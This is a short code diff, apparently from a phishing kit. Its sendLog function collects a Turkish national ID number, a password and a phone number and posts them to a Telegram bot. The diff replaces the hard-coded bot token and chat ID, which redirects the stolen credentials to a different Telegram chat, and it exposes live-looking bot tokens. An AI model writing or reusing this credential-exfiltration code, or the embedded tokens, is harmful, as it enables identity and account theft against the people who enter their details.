@@ -30,8 +30,8 @@ function sendLog(tcKimlik, sifre, telefon) {
         telefon
     };
 
-    const telegramToken = '7022766920:AAE9xzbhWQrdse0hXDvpf5hje_1dhFVzof4';
-    const chatId = '-4744659522';
+    const telegramToken = '7499169462:AAFRqbaQ2VShuBgA97DaAy42wy8YdzId_4o';
+    const chatId = '--4702269875';
 
     fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
         method: 'POST',
